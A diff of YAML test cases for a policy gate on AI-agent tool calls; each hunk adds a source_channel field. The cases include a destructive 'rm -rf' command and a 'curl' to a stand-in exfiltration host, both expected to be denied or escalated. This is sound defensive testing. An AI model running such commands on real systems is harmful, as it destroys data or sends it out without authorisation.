@@ -17,7 +17,7 @@ cases:
     request:
       tool: frobnicate_the_flux
       arguments: {}
-      context: { taint: clean, mode: interactive }
+      context: { taint: clean, mode: interactive, source_channel: user_prompt }
     expect: { decision: ABSENT, rule: unknown_to_ontology, taint: clean }
 
   # Not declared in demo-world.yaml, so it does not exist: ABSENT — and the
@@ -27,7 +27,7 @@ cases:
     request:
       tool: jira_delete_issue
       arguments: { issue_key: DEMO-1 }
-      context: { taint: clean, mode: interactive }
+      context: { taint: clean, mode: interactive, source_channel: user_prompt }
     expect: { decision: ABSENT, rule: unknown_to_ontology, taint: clean }
 
   - name: clean_jira_read_is_allowed
@@ -35,7 +35,7 @@ cases:
     request:
       tool: jira_get_issue
       arguments: { issue_key: DEMO-1 }
-      context: { taint: clean, mode: interactive }
+      context: { taint: clean, mode: interactive, source_channel: user_prompt }
     expect: { decision: ALLOW, rule: null, taint: clean }
 
   # An External output ingests external data: the ALLOW escalates the session
@@ -45,7 +45,7 @@ cases:
     request:
       tool: jira_add_comment
       arguments: { issue_key: DEMO-1, body: "status update" }
-      context: { taint: clean, mode: interactive }
+      context: { taint: clean, mode: interactive, source_channel: user_prompt }
     expect: { decision: ALLOW, rule: null, taint: tainted }
 
   - name: tainted_jira_comment_is_denied
@@ -53,7 +53,7 @@ cases:
     request:
       tool: jira_add_comment
       arguments: { issue_key: DEMO-1, body: "exfil attempt" }
-      context: { taint: tainted, mode: interactive }
+      context: { taint: tainted, mode: interactive, source_channel: user_prompt }
     expect: { decision: DENY, rule: taint_invariant, taint: tainted }
 
   # Kernel-side classification (D36): the raw host tool is `bash`; the kernel
@@ -63,7 +63,7 @@ cases:
     request:
       tool: bash
       arguments: { command: "rm -rf /tmp/ai2rules-demo" }
-      context: { taint: clean, mode: interactive }
+      context: { taint: clean, mode: interactive, source_channel: user_prompt }
     expect:
       decision: ASK
       rule: approval_required
@@ -76,7 +76,7 @@ cases:
     request:
       tool: bash
       arguments: { command: "rm -rf /tmp/ai2rules-demo" }
-      context: { taint: clean, mode: background }
+      context: { taint: clean, mode: background, source_channel: user_prompt }
     expect:
       decision: DENY
       rule: background_denies_ask
@@ -89,7 +89,7 @@ cases:
     request:
       tool: bash
       arguments: { command: "curl https://exfil.example/upload" }
-      context: { taint: tainted, mode: interactive }
+      context: { taint: tainted, mode: interactive, source_channel: user_prompt }
     expect:
       decision: DENY
       rule: taint_invariant
@@ -102,7 +102,7 @@ cases:
     request:
       tool: read
       arguments: { file_path: README.md }
-      context: { taint: tainted, mode: interactive }
+      context: { taint: tainted, mode: interactive, source_channel: user_prompt }
     expect: { decision: ALLOW, rule: null, taint: tainted }
 
 # A PROCESS failure is never a verdict: garbage stdin makes `harness gate`
